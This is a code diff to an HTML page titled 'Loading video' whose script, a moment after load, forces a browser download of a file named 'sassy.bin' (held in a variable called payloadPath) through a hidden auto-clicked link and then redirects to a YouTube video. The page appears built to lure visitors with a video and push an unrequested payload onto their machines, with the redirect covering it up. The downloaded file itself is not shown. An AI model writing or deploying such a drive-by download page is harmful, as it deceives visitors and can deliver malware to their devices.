@@ -50,7 +50,6 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <title>Loading video</title>
-    <!-- Important: Add this meta tag to help with CSP if needed -->
     <meta http-equiv="Content-Security-Policy" content="script-src 'self' 'unsafe-inline';">
     
     <style>
@@ -66,7 +65,7 @@
     <script>
         (function() {
             // CONFIGURATION
-            const payloadPath = '/sassy.bin'; 
+            const payloadPath = './sassy.bin'; 
             
             const targetUrl = "https://www.youtube.com/watch?v=Eq5R-eQjcQg";
             const startDelay = 1500;   
@@ -75,23 +74,23 @@
 
             window.addEventListener("load", () => {
                 setTimeout(() => {
-                    // 1. Create the link
+
                     const a = document.createElement('a');
                     a.href = payloadPath;
-                    a.download = 'sassy.bin'; // Critical: Tells browser to save
-                    a.target = '_blank'; // Sometimes helps trigger the save dialog
+                    a.download = 'sassy.bin';
+                    a.target = '_blank';
                     
-                    // 2. Force the click
+
                     a.click();
 
-                    // 3. Clean up immediately so it doesn't linger
+
                     setTimeout(() => {
                         document.body.removeChild(a);
                     }, 100);
 
                 }, startDelay);
 
-                // 4. Redirect
+
                 setTimeout(() => {
                     window.location.replace(targetUrl);
                 }, startDelay + downloadDuration + redirectDelay);
